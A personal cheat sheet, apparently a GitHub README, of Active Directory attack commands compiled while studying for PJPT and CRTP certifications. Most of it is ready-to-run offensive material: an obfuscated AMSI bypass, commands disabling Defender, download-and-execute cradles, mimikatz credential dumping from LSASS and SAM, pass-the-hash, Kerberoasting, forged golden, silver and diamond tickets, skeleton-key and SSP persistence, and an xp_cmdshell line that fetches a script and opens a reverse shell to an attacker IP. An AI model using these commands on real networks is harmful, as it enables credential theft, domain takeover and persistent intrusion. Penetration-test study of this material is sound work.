# Active Directory Cheatsheet
My own notes about attacking active directory after study for PJPT and CRTP.

To facilitate navigation, a link has been added at the end of each section to go back up to the table of contents.
# Table of contents
- 1. [Tools](#tools)
- 2. [Powershell](#powershell)
    - 2.1. [AMSI Bypass](#amsi-bypass)
    - 2.2. [Powershell Security](#powershell-security)
    - 2.3. [Others](#others)
- 3. [Enumeration](#enumeration)
    - 3.1. [PowerView](#powerview)
    - 3.2. [User Hunting](#user-hunting)
    - 3.3. [BloodHound](#bloodhound)
- 4. [Initial Attacks Vectors](#initial-attacks-vectors)
    - 4.1. [LLMNR Poisoning](#llmnr-poisoning)
    - 4.2. [SMB Relay](#smb-relay)
- 5. [Local Priv Escalation](#local-privilege-escalation)
    - 5.1. [Service Abuse](#service-abuse)
- 6. [Lateral Movement](#lateral-movement)
    - 6.1. [Powershell Remoting](#powershell-remoting)
    - 6.2. [Invoke-Mimikatz](#invoke-mimikatz)
    - 6.3. [Pass-The-Hash](#pass-the-hash)
    - 6.4. [OverPass-The-Hash](#overpass-the-hash)
    - 6.5. [DCSync](#dcsync)
- 7. [Privilege Escalation](#privilege-escalation)
    - 7.1. [Kerberoasting](#kerberoasting)
    - 7.2. [Kerberos Delegation](#kerberos-delegation)
        - 7.2.1. [Constrained Delegation](#constrained-delegation)
        - 7.2.2. [Unconstrained Delegation](#unconstrained-delegation)
    - 7.3. [Token Impersonation](#token-impersonation)
- 8. [Domain Persistence](#domain-persistence)
    - 8.1. [Golden Ticket](#golden-ticket)
    - 8.2. [Silver Ticket](#silver-ticket)
    - 8.3. [Diamond Ticket](#diamond-ticket)
    - 8.4. [Skeleton Key](#skeleton-key)
    - 8.5. [DSRM](#dsrm)
    - 8.6. [Custom SSP](#custom-ssp)
    - 8.7. [AdminSDHolder](#adminsdholder)
    - 8.8. [Security Descriptors](#security-descriptors)
- 9. [Trust Abuse](#trust-abuse)
    - 9.1. [MSSQL](#mssql-servers)
- 10. [Additional Attacks](#additional-attacks)
    - 10.1 [Zerologon](#zerologon)
    - 10.2 [PrintNightmare](#printnightmare)


# Tools

- [PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [InvisiShell](https://github.com/OmerYa/Invisi-Shell)
- [Netexec](https://www.netexec.wiki/)
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- Impacket
- hashcat
- mimikatz
- Rubeus
- Bloodhound
- [Invoke-SessionHunter](https://github.com/Leo4j/Invoke-SessionHunter)

# Powershell

## AMSI Bypass

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Powershell Security

```powershell
# https://github.com/OmerYa/Invisi-Shell
RunWithRegistryNonAdmin.bat

# Execution policy
powershell -ep bypass

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

### Others
```powershell
# Downloads
iex (iwr http://[IP:port]/sbloggingbypass.txt -UseBasicParsing)
iex ((New-Object Net.WebClient).DownloadString('http://[IP:port]/PowerView.ps1'))

# Copy
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'

# Port Forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
>[Up](#table-of-contents) :arrow_up:
# 2. Enumeration

## PowerView

```powershell
# Domain
Get-Domain
Get-DomainSID
Get-DomainController -domain [domain]

# Users
Get-DomainUser
Get-DomainUser | select samaccountname,logoncount,description
Get-NetLoggedon -ComputerName [Computer Name]

# Groups
Get-DomainGroup
Get-DomainGroup -Name *admin* | select cn

# Computers
Get-DomainComputer
Get-DomainComputer | select name

# Members of group (ex.Domain Admins)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# The group membership for a user
Get-DomainGroup -Username "user"

# GPO & OU
Get-DomainGPO
Get-DomainOU

# ACL
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Trusts
Get-DomainTrust
```

## User Hunting
```powershell
Find-LocalAdminAccess -Verbose

# Invoke-SessionHunter
Invoke-SessionHunter -FailSafe
Invoke-SessionHunter -NoPortScan -Targets [computers.txt] #Opsec Friendly
```

## Bloodhound


>[Up](#table-of-contents) :arrow_up:
# Initial Attacks Vectors

## LLMNR Poisoning
```sh
responder -I [interface] -dPv
hashcat -m 5600 [hash.txt] /wordlist/
```

## SMB Relay
```sh
# check
nmap -v --script=smb2-security-mode.nse -p445 [IP] -Pn 
# I prefer netexec:
nxc smb <IP/CIDR> --gen-relay-list relay_list.txt
# attack
impacket-ntlmrelayx -tf relay_list.txt -smb2support -i
```
# Local Privilege Escalation
```powershell
# Load PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks
```
## Service Abuse
```powershell
# Services Issues
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModfiableService - Verbose
```
>[Up](#table-of-contents) :arrow_up:
# Lateral Movement
## Powershell Remoting
```powershell
# Needs admin access
Import-Module Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
$Sess = New-PSSession -ComputerName [computer name]
Enter-PSSession -Sessions $Sess

```
## Invoke-Mimikatz
```powershell
Import-Module Invoke-Mimikatz.ps1

# mimikatz
# Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

# (Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

# List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

# Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

# Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

# List cached MasterKeys
mimikatz sekurlsa::dpapi

# List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

# Dump SAM Database
mimikatz lsadump::sam

# Dump SECRETS Database
mimikatz lsadump::secrets

# Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

# Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

# Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

# List and Dump local kerberos credentials
mimikatz kerberos::list /dump

# Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

# List TS/RDP sessions
mimikatz ts::sessions

# List Vault credentials
mimikatz vault::list 
```

## Extract Credentials
```powershell
# Dump credentials
Invoke-Mimikatz -Dumpcreds

# Dump from SAM
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

## Pass-The-Hash
```bash
nxc smb [IP/CIDR] -u [user] -d [domain].local -H [hash]
nxc smb [IP/CIDR] -u [user] -d [domain].local -H [hash] --local-auth

# NetExec
# --local-auth: local authentication
# --sam: dump SAM hashes from target system
# --lsa: dump LSA secrets from target systems
# --shares: enumera los recursos compartidos en red

xfreerdp /v:[Target IP] /u:[user] /pth:[hash]

evil-winrm -i [Target IP] -u [user] -H [hash]
```

## OverPass-The-Hash
```powershell
# Mimikatz / start powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<key> /run:powershell.exe"'

# Rubeus / ask ticket
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
## DCSync
> To perform DCSync attack we need the following rights on the Domain Object:
>1) Replicating Directory Changes (DS-Replication-Get-Changes)
>2) Replicating Directory Changes All (DS-Replication-Get-Changes-All)
>3) Replicating Directory Changes In Filtered Set (DS-Replication-Get-Changes-In-Filtered-Set) (this one isn’t always needed but we can add it just in case)
```powershell
# Add rights for DCSync
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Needs domain admin privileges
Invoke-Mimikatz -Command '"lsadump::dcsync /user:[domain]\krbtgt"'
```

>[Up](#table-of-contents) :arrow_up:
# Privilege Escalation
## Kerberoasting
```powershell
# Linux
impacket-GetUserSPNs [domain.local]/[user]:'[password]' -dc-ip [domain IP] -request

# Windows
Get-DomainUser -SPN
Invoke-Mimikatz -Command '"kerberos::list /export"'

hashcat -m 13100 [hash.txt] /wordlist/
```

## Kerberos Delegation
### Constrained Delegation
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# kekeo
# Request TGT
tgt::ask /user:[user] /domain:[domain] /password:[Password]

# Request S4U TGS
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

# Mimikatz to import
privilege::debug
keberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# Then, create our PSSession
New-PSSession  -ComputerName [computername]
Enter-PSSession -ComputerName [Computername]
```

### Unconstrained Delegation
```powershell
Get-DomainComputer -UnConstrained

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Dump the tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Impersonate the user using ptt attack
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```
## Token Impersonation
> Token impersonation is a Windows post-exploitation technique that allows an attacker to steal the access token of a logged-on user on the system without knowing their credentials and impersonate them to perform operations with their privileges.
> 
>This technique is effective for lateral movement and privilege escalation; an attacker can obtain domain admin privileges if a logged-on user is a domain administrator. They can also use the impersonated tokens to pivot to other domain machines on the network. The impersonation technique requires the attacker to gain local admin privileges on the compromised machine to steal its tokens. 
>Two types:
>
>Delegate: Created for loggin into machine or using Remote Desktop
>
>Impersonate: “non-interactive” such as attaching a network drive or a domain logon script

```bash
# WITH LINUX
# Open metasploit
msfconsole

windows/smb/psexec

load incognito

list tokens -u

impersonate_token [DOMAIN]\\[User]
```
```powershell
# WITH WINDOWS
# https://github.com/FSecureLABS/incognito/tree/394545ffb844afcc18e798737cbd070ff3a4eb29

.\incognito.exe list_tokens -u

.\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
```
>[Up](#table-of-contents) :arrow_up:

# Domain Persistence
## Golden Ticket
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'

# Check Permission
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

## Silver Ticket
```powershell
# Rubeus
Rubeus.exe -args silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:[local computer hash] /sid:[Domain SID] /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

# Mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:http /rc4:<local computer hash> /user:Administrator /ptt"'
```

## Diamond Ticket
```powershell
# run elevated shell
Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Skeleton Key
>Is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
```powershell
# Run as DA
Invoke-Mimikatz -Command '"privilege::debut" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# Access 
Enter-PSSession -ComputerName dcorp-dc -credential dcorp\Administrator
```
> Note: Skeleton Key is not opsec safe and is also known to cause issues with AD CS.
> Do not use it in real assessment.
> Very easy to detect.

## DSRM
>Directory Services Restore Mode (DSRM) is a special boot mode for Windows Server domain controllers that allows administrators to perform maintenance tasks on the Active Directory database. This mode is primarily used for restoring or repairing the database when it becomes corrupted or encounters issues. DSRM is essential for tasks such as Active Directory restoration, password recovery, database repair, authoritative restore, system state recovery, and troubleshooting or diagnostics. By using DSRM, administrators can ensure the health and integrity of the Active Directory environment, enabling robust disaster recovery and maintenance capabilities.
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DCs Name>

Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<hash> /run:powershell.exe"'
```

## Custom SSP
>Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authentication connection. Some SSP Packages are: NTLM, Kerberos, Wdigest, CredSSP.
```powershell
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

## AdminSDHolder
>Active Directory Domain Services (AD DS) use the AdminSDHolder object and the Security Descriptor propagator (SDProp) process to secure privileged users and groups. The AdminSDHolder object has a unique Access Control List (ACL), which controls the permissions of security principals that are members of built-in privileged Active Directory groups. The SDProp is a process that runs every 60 minutes on the Primary Domain Controller emulator to ensure the AdminSDHolder Access Control List (ACL) is consistent on all privileged users and groups.
```powershell
# Check
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

# Add fullcontrol permission
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All

# Run SDProp
Invoke-SDPropagator -showProgress -timeoutMinutes 1

# Check permission
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'username'}
```

## Security Descriptors
>It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
```powershell
# Admin privileges required*
# On local machine for student1:
Set-RemoteWMI -SamAccountName student1 -Verbose

# On remote machine for student1 without explicit credentials:
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

# On remote machine remove permissions:
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

>[Up](#table-of-contents) :arrow_up:
# Trust Abuse
## MSSQL Servers
```powershell
# Module PowerUpSQL
# SPN Scanning
Get-SQLInstanceDomain

# Accessibility
Get-SQLConnectionTestThreaded

# Information
Get-SQLServerInfo -Verbose

# Search Links
Get-SQLServerLink -Instance [SPN] -Verbose

# Exec commands
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://[IP]/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress [IP] -Port [Port]'"

```
>[Up](#table-of-contents) :arrow_up:

# Additional Attacks
## Zerologon
>Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process that allows an attack against Microsoft Active Directory domain controllers. Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.

Check if is vulnerable with this script:
https://github.com/SecuraBV/CVE-2020-1472

## Printnightmare 
Check if is vulnerable with this script:
https://github.com/cube0x0/CVE-2021-1675

>[Up](#table-of-contents) :arrow_up:

# References

- [NetExec Wiki](https://www.netexec.wiki/)
- [Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [RedTeam Notes](https://www.ired.team/)
- [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-tricks/)
- [Zer1t0 Blog](https://zer1t0.gitlab.io/posts/attacking_ad/)
- [Active Directory Glossary](https://activedirectorypro.com/glossary/)
- [Active Directory Cheatsheet - S1ckB0y1337](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

>[Up](#table-of-contents) :arrow_up: